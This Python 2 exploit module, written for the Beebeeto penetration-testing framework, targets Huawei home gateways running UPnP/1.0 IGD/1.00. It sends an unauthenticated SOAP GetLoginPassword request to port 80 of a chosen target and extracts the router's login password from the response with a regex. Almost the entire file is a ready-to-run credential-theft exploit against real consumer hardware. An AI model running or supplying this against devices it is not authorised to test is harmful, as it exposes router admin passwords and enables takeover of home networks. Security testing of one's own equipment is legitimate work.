#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import socket

from baseframe import BaseFrame
from utils.http import transform_target_ip


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0120',
            'name': 'Huawei Home Gateway UPnP/1.0 IGD/1.00 Password Disclosure Exploit',
            'author': 'tmp',
            'create_date': '2015-07-03',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Huawei',
            'vul_version': ['UPnP/1.0', 'IGD/1.00'],
            'type': 'Information Disclosure',
            'tag': ['华为漏洞', 'Password Disclosure Vulnerability'],
            'desc': 'N/A',
            'references': ['https://www.exploit-db.com/exploits/37424/',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        # set timeout
        timeout = 20
        socket.setdefaulttimeout(timeout)
        target = transform_target_ip(args['options']['target'])
        if args['options']['verbose']:
            print '[*] Connecting to: ' + target
        # Connect the socket to the port where the server is listening
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (target, 80)
        sock.connect(server_address)
        soap = "<?xml version=\"1.0\"?>"
        soap +="<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
        soap +="<s:Body>"
        soap +="<m:GetLoginPassword xmlns:m=\"urn:dslforum-org:service:UserInterface:1\">"
        soap +="</m:GetLoginPassword>"
        soap +="</s:Body>"
        soap +="</s:Envelope>"
        message = "POST /UD/?5 HTTP/1.1\r\n"
        message += "SOAPACTION: \"urn:dslforum-org:service:UserInterface:1#GetLoginPassword\"\r\n"
        message += "Content-Type: text/xml; charset=\"utf-8\"\r\n"
        message += "Host:" + target + "\r\n"
        message += "Content-Length:" + str(len(soap)) +"\r\n"
        message += "Expect: 100-continue\r\n"
        message += "Connection: Keep-Alive\r\n\r\n"
        sock.send(message)
        data = sock.recv(1024)
        if args['options']['verbose']:
            print "[*] Recieved : " + data.strip()
        sock.send(soap)
        data = sock.recv(1024)
        data += sock.recv(1024)
        r = re.compile('<NewUserpassword>(.*?)</NewUserpassword>')
        m = r.search(data)
        if m:
            args['success'] = True
            args['poc_ret']['password'] = m.group(1)
        sock.close()
        return args


    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())